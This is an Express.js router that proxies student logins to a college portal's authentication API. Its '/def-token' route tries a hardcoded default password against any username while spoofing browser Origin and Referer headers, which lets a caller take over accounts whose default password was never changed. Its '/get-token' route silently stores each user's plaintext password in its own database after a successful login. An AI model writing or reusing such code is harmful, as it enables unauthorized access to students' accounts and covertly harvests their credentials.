const express = require('express');
const axios = require('axios');
const cors = require('cors');
const StudentDetail = require('../models/studentDetails');

const router = express.Router();

// CORS configuration
router.use(
  cors({
    origin: [
      'http://localhost:5173',
      'https://kmit.teleuniv.in'
    ],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true,
  })
);

const COLLEGE_AUTH_URL = process.env.COLLEGE_AUTH_URL || 'https://kmit-api.teleuniv.in/auth/login';

// Utility to mask sensitive fields
const safeLog = (data) => {
  const logged = { ...data };
  if (logged.captcha) logged.captcha = `${logged.captcha.slice(0, 10)}...${logged.captcha.slice(-5)}`;
  if (logged.password) logged.password = '***';
  return logged;
};

/**
 * POST /api/def-token
 * Authenticate using default password
 */
router.post('/def-token', async (req, res) => {
  try {
    const { username, password = 'Kmit123$', captcha, application = 'netra' } = req.body;

    if (!username || !captcha) {
      return res.status(400).json({ success: 0, error: 'Missing required fields: username or captcha' });
    }

    const authResp = await axios.post(
      COLLEGE_AUTH_URL,
      { username, password, application, token: captcha },
      {
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'https://kmit.teleuniv.in',
          'Referer': 'https://kmit.teleuniv.in/',
          'User-Agent': 'Mozilla/5.0'
        },
        timeout: 15000
      }
    );

    if (authResp.data?.Error === false) {
      return res.json({
        success: 1,
        token: authResp.data.access_token || authResp.data.token,
        refresh_token: authResp.data.refresh_token,
        message: 'Authentication successful'
      });
    }

    return res.status(401).json({
      success: 0,
      error: authResp.data?.message || 'Authentication failed',
      details: authResp.data
    });

  } catch (err) {
    if (err.code === 'ECONNABORTED') {
      return res.status(504).json({ success: 0, error: 'Request timeout' });
    }

    if (err.response) {
      return res.status(err.response.status).json({
        success: 0,
        error: err.response.data?.message || 'College API error',
        details: err.response.data
      });
    }

    return res.status(500).json({ success: 0, error: 'Internal server error' });
  }
});

/**
 * POST /api/get-token
 * Authenticate using user-provided password
 */
router.post('/get-token', async (req, res) => {
  try {
    const { username, password, captcha, application = 'netra' } = req.body;

    if (!username || !password || !captcha) {
      return res.status(400).json({ success: 0, error: 'Missing required fields' });
    }

    const authResp = await axios.post(
      COLLEGE_AUTH_URL,
      { username, password, application, token: captcha },
      {
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'https://kmit.teleuniv.in',
          'Referer': 'https://kmit.teleuniv.in/'
        },
        timeout: 15000
      }
    );

    if (authResp.data?.Error === false) {
      await StudentDetail.findOneAndUpdate(
        { phone: username },
        { lastPassword: password },
        { upsert: true }
      );

      return res.json({
        success: 1,
        token: authResp.data.access_token,
        refresh_token: authResp.data.refresh_token
      });
    }

    return res.status(401).json({
      success: 0,
      error: authResp.data?.message || 'Authentication failed'
    });

  } catch (err) {
    return res.status(500).json({ success: 0, error: 'Internal server error' });
  }
});

module.exports = router;
